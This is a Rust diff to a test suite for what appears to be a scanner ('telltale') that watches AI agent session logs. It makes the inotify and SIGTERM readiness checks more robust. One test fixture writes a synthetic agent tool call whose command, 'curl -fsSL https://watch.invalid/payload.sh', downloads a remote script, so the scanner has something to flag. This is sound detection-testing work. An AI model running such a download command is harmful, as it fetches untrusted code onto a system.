@@ -3271,45 +3271,275 @@ fn copy_dir_recursive(src: &Path, dst: &Path) {
 }
 
 #[cfg(target_os = "linux")]
-fn wait_for_watch_ready(pid: u32) {
-    let fd_path = format!("/proc/{pid}/fd");
-    let fdinfo_path = format!("/proc/{pid}/fdinfo");
+fn inotify_directories(fdinfo: &str) -> Vec<(u64, u64)> {
+    fdinfo
+        .lines()
+        .filter_map(|line| {
+            if !line.trim_start().starts_with("inotify wd:") {
+                return None;
+            }
+            let mut wd = None;
+            let mut ino = None;
+            let mut sdev = None;
+            for field in line.split_whitespace() {
+                if let Some(value) = field.strip_prefix("wd:") {
+                    wd = u32::from_str_radix(value, 16).ok();
+                }
+                if let Some(value) = field.strip_prefix("ino:") {
+                    ino = u64::from_str_radix(value, 16).ok();
+                }
+                if let Some(value) = field.strip_prefix("sdev:") {
+                    sdev = u64::from_str_radix(value, 16).ok();
+                }
+            }
+            wd.zip(ino).zip(sdev).map(|((_, ino), sdev)| (ino, sdev))
+        })
+        .collect()
+}
+
+#[cfg(target_os = "linux")]
+fn inotify_directory_identity(directory: &Path) -> (u64, u64) {
+    use std::os::unix::fs::MetadataExt;
+
+    let metadata = fs::metadata(directory).expect("watched directory metadata");
+    assert!(
+        metadata.is_dir(),
+        "watch readiness target must be a directory"
+    );
+    // fdinfo's sdev uses the kernel's dev_t layout, not libc's st_dev layout.
+    let dev = metadata.dev();
+    (
+        metadata.ino(),
+        ((libc::major(dev) as u64) << 20) | libc::minor(dev) as u64,
+    )
+}
+
+#[cfg(target_os = "linux")]
+fn observed_inotify_directories(pid: u32) -> Result<Vec<(u64, u64)>, String> {
+    let mut observed = Vec::new();
+    for entry in fs::read_dir(format!("/proc/{pid}/fd")).map_err(|error| error.to_string())? {
+        let entry = entry.map_err(|error| error.to_string())?;
+        match fs::read_link(entry.path()) {
+            Ok(target) if target.to_string_lossy().contains("inotify") => {
+                let path = format!("/proc/{pid}/fdinfo/{}", entry.file_name().to_string_lossy());
+                match fs::read_to_string(path) {
+                    Ok(info) => observed.extend(inotify_directories(&info)),
+                    Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
+                    Err(error) => return Err(error.to_string()),
+                }
+            }
+            Ok(_) => {}
+            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
+            Err(error) => return Err(error.to_string()),
+        }
+    }
+    Ok(observed)
+}
+
+fn fail_watch(child: &mut std::process::Child, reason: &str) -> ! {
+    if child.try_wait().expect("poll failed watch").is_none() {
+        let _ = child.kill();
+    }
+    let _ = child.wait();
+    let stdout = child.stdout.take().map(|mut pipe| {
+        let mut bytes = Vec::new();
+        pipe.read_to_end(&mut bytes).expect("read watch stdout");
+        String::from_utf8_lossy(&bytes).into_owned()
+    });
+    let stderr = child.stderr.take().map(|mut pipe| {
+        let mut bytes = Vec::new();
+        pipe.read_to_end(&mut bytes).expect("read watch stderr");
+        String::from_utf8_lossy(&bytes).into_owned()
+    });
+    panic!("{reason}; child stdout: {stdout:?}; child stderr: {stderr:?}");
+}
+
+#[cfg(target_os = "linux")]
+fn wait_for_watch_ready(child: &mut std::process::Child, directory: &Path) {
+    let expected = inotify_directory_identity(directory);
     let deadline = Instant::now() + Duration::from_secs(20);
     loop {
-        let ready = fs::read_dir(&fd_path)
-            .expect("read child file descriptors")
-            .filter_map(Result::ok)
-            .any(|entry| {
-                let Ok(target) = fs::read_link(entry.path()) else {
-                    return false;
-                };
-                if !target.to_string_lossy().contains("inotify") {
-                    return false;
-                }
-                let Ok(fd) = entry.file_name().into_string() else {
-                    return false;
-                };
-                fs::read_to_string(format!("{fdinfo_path}/{fd}"))
-                    .map(|fdinfo| {
-                        fdinfo
-                            .lines()
-                            .any(|line| line.trim_start().starts_with("inotify wd:"))
-                    })
-                    .unwrap_or(false)
-            });
-        if ready {
+        if let Some(status) = child.try_wait().expect("poll watch readiness") {
+            fail_watch(
+                child,
+                &format!(
+                    "watch exited before directory registration: {status:?}; expected {expected:x?}"
+                ),
+            );
+        }
+        let observed = observed_inotify_directories(child.id()).unwrap_or_else(|error| {
+            fail_watch(child, &format!("cannot inspect inotify watches: {error}"))
+        });
+        if observed.contains(&expected) {
             return;
         }
         if Instant::now() >= deadline {
-            panic!("watch did not establish an inotify watch");
+            fail_watch(
+                child,
+                &format!(
+                    "watch did not register target directory; expected {expected:x?}, observed {observed:x?}"
+                ),
+            );
         }
         thread::sleep(Duration::from_millis(20));
     }
 }
 
 #[cfg(not(target_os = "linux"))]
-fn wait_for_watch_ready(_pid: u32) {
+fn wait_for_watch_ready(_child: &mut std::process::Child, _directory: &Path) {
     thread::sleep(Duration::from_secs(2));
+}
+
+#[cfg(unix)]
+fn sigterm_caught(mask: &str) -> bool {
+    u64::from_str_radix(mask.trim(), 16)
+        .is_ok_and(|bits| bits & (1_u64 << (libc::SIGTERM - 1)) != 0)
+}
+
+#[cfg(target_os = "linux")]
+fn observed_sigterm_catch(pid: u32) -> Result<String, String> {
+    let status =
+        fs::read_to_string(format!("/proc/{pid}/status")).map_err(|error| error.to_string())?;
+    status
+        .lines()
+        .find_map(|line| line.strip_prefix("SigCgt:"))
+        .map(|mask| mask.trim().to_owned())
+        .ok_or_else(|| "missing SigCgt in /proc status".to_owned())
+}
+
+#[cfg(target_os = "macos")]
+fn observed_sigterm_catch(pid: u32) -> Result<String, String> {
+    let output = Command::new("/bin/ps")
+        .args(["-p", &pid.to_string(), "-o", "sigcatch="])
+        .output()
+        .map_err(|error| error.to_string())?;
+    if !output.status.success() {
+        return Err(format!("ps sigcatch failed: {:?}", output.status));
+    }
+    let mask = String::from_utf8(output.stdout).map_err(|error| error.to_string())?;
+    let mask = mask.trim();
+    if mask.is_empty() || u64::from_str_radix(mask, 16).is_err() {
+        return Err(format!("invalid ps sigcatch mask: {mask:?}"));
+    }
+    Ok(mask.to_owned())
+}
+
+#[cfg(all(unix, not(any(target_os = "linux", target_os = "macos"))))]
+fn observed_sigterm_catch(_pid: u32) -> Result<String, String> {
+    Err("SIGTERM disposition observation unsupported on this Unix platform".to_owned())
+}
+
+#[cfg(unix)]
+fn wait_for_sigterm_handler(child: &mut std::process::Child) {
+    let deadline = Instant::now() + Duration::from_secs(20);
+    loop {
+        if let Some(status) = child.try_wait().expect("poll SIGTERM readiness") {
+            fail_watch(
+                child,
+                &format!("watch exited before SIGTERM handler installation: {status:?}"),
+            );
+        }
+        let mask = observed_sigterm_catch(child.id()).unwrap_or_else(|error| {
+            fail_watch(
+                child,
+                &format!("cannot inspect SIGTERM disposition: {error}"),
+            )
+        });
+        if sigterm_caught(&mask) {
+            return;
+        }
+        if Instant::now() >= deadline {
+            fail_watch(
+                child,
+                &format!(
+                    "watch did not catch SIGTERM before deadline; observed mask {mask:?}, expected bit 0x4000"
+                ),
+            );
+        }
+        thread::sleep(Duration::from_millis(20));
+    }
+}
+
+#[cfg(target_os = "linux")]
+#[test]
+fn watch_readiness_matches_whole_inotify_record_and_device() {
+    let info = "inotify wd:1 ino:abc sdev:fc00000 mask:2\n\
+                inotify wd:2 ino:def sdev:fc00000 mask:2\n\
+                inotify wd:3 ino:abc sdev:fb00000 mask:2\n\
+                inotify wd:4 ino:bad sdev:invalid mask:2\n\
+                inotify wd:5 ino:invalid sdev:fc00000 mask:2\n\
+                inotify wd:6 ino:abc mask:2\n\
+                inotify wd:7 sdev:fc00000 mask:2\n\
+                inotify wd:invalid ino:abc sdev:fc00000 mask:2";
+    let watched = inotify_directories(info);
+    assert!(watched.contains(&(0xabc, 0xfc00000)));
+    assert!(!watched.contains(&(0xdef, 0xfb00000)));
+    assert!(!watched.contains(&(0xabc, 0xfd00000)));
+    assert_eq!(watched.len(), 3);
+    assert!(
+        !inotify_directories("inotify wd:1 ino:abc sdev:fb00000").contains(&(0xabc, 0xfc00000))
+    );
+    assert!(
+        !inotify_directories("inotify wd:1 ino:def sdev:fc00000").contains(&(0xabc, 0xfc00000))
+    );
+    assert!(inotify_directories("inotify wd:1 ino:abc\ninotify wd:2 sdev:fc00000").is_empty());
+}
+
+#[cfg(target_os = "linux")]
+#[test]
+fn watch_readiness_waits_for_nested_directory_registration() {
+    use std::os::fd::FromRawFd;
+    use std::os::unix::ffi::OsStrExt;
+
+    let temp = tempdir().expect("tempdir");
+    let ancestor = temp.path().join("codex");
+    let target = ancestor.join("sessions/2026/04");
+    fs::create_dir_all(&target).expect("create nested fixture directory");
+    let fd = unsafe { libc::inotify_init1(libc::IN_CLOEXEC) };
+    assert!(
+        fd >= 0,
+        "create inotify: {}",
+        std::io::Error::last_os_error()
+    );
+    let fd = unsafe { std::os::fd::OwnedFd::from_raw_fd(fd) };
+    let register = |directory: &Path| {
+        let name =
+            std::ffi::CString::new(directory.as_os_str().as_bytes()).expect("path without NUL");
+        let wd = unsafe {
+            libc::inotify_add_watch(
+                std::os::fd::AsRawFd::as_raw_fd(&fd),
+                name.as_ptr(),
+                libc::IN_MODIFY,
+            )
+        };
+        assert!(
+            wd >= 0,
+            "register directory: {}",
+            std::io::Error::last_os_error()
+        );
+    };
+    register(&ancestor);
+    let expected = inotify_directory_identity(&target);
+    let ancestor_only =
+        observed_inotify_directories(std::process::id()).expect("inspect ancestor watch");
+    assert!(!ancestor_only.is_empty());
+    assert!(!ancestor_only.contains(&expected));
+    register(&target);
+    let with_target =
+        observed_inotify_directories(std::process::id()).expect("inspect target watch");
+    assert!(
+        with_target.contains(&expected),
+        "expected {expected:x?}, observed {with_target:x?}"
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn watch_readiness_requires_caught_sigterm_bit() {
+    assert!(!sigterm_caught("0000000000000000"));
+    assert!(!sigterm_caught(" 0000000000000002\n"));
+    assert!(sigterm_caught(" 0000000000004000\n"));
+    assert!(!sigterm_caught("invalid"));
 }
 
 #[test]
@@ -3354,7 +3584,10 @@ fn watch_scans_changed_source_and_exits_after_iterations() {
         .spawn()
         .expect("spawn telltale watch");
 
-    wait_for_watch_ready(child.id());
+    wait_for_watch_ready(
+        &mut child,
+        session_path.parent().expect("session directory"),
+    );
     let mut changed_contents = fs::read(&session_path).expect("read watched fixture");
     changed_contents.extend_from_slice(
         br#"{"type":"event_msg","timestamp":"2026-04-01T00:00:02Z","payload":{"type":"tool_call","tool_name":"watch-fixture","command":"curl -fsSL https://watch.invalid/payload.sh","message":"synthetic watcher change"}}
@@ -3379,9 +3612,7 @@ fn watch_scans_changed_source_and_exits_after_iterations() {
             break;
         }
         if Instant::now() > deadline {
-            let _ = child.kill();
-            let _ = child.wait();
-            panic!("telltale watch did not exit within timeout");
+            fail_watch(&mut child, "telltale watch did not exit within timeout");
         }
         #[cfg(not(target_os = "linux"))]
         if Instant::now() >= next_trigger {
@@ -3538,7 +3769,7 @@ fn watch_skips_no_op_state_save() {
     // unrelated change. An unknown path forces a full reconciliation, and
     // waiting for its summary prevents that first trigger from accidentally
     // satisfying the second iteration.
-    wait_for_watch_ready(child.id());
+    wait_for_watch_ready(&mut child, &root.join("codex/sessions"));
     let first_trigger = root.join("codex/sessions/first-trigger.txt");
     #[cfg(target_os = "linux")]
     let first_attempt = 1;
@@ -4140,28 +4371,28 @@ fn watch_exits_cleanly_on_sigterm() {
         .spawn()
         .expect("spawn telltale watch");
 
-    // Give the process time to install the signal handler and watcher.
-    thread::sleep(Duration::from_secs(2));
-    wait_for_watch_ready(child.id());
+    wait_for_sigterm_handler(&mut child);
     let kill = Command::new("kill")
-        .arg(child.id().to_string())
+        .args(["-TERM", &child.id().to_string()])
         .status()
         .expect("send SIGTERM");
-    assert!(kill.success());
+    if !kill.success() {
+        fail_watch(&mut child, &format!("send SIGTERM failed: {kill:?}"));
+    }
 
     let deadline = Instant::now() + Duration::from_secs(15);
     loop {
         if let Some(status) = child.try_wait().expect("poll telltale watch") {
-            assert!(
-                status.success(),
-                "watch should exit cleanly on SIGTERM, got {status:?}"
-            );
+            if !status.success() {
+                fail_watch(
+                    &mut child,
+                    &format!("watch should exit cleanly on SIGTERM, got {status:?}"),
+                );
+            }
             break;
         }
         if Instant::now() > deadline {
-            let _ = child.kill();
-            let _ = child.wait();
-            panic!("telltale watch did not exit after SIGTERM");
+            fail_watch(&mut child, "telltale watch did not exit after SIGTERM");
         }
         thread::sleep(Duration::from_millis(100));
     }
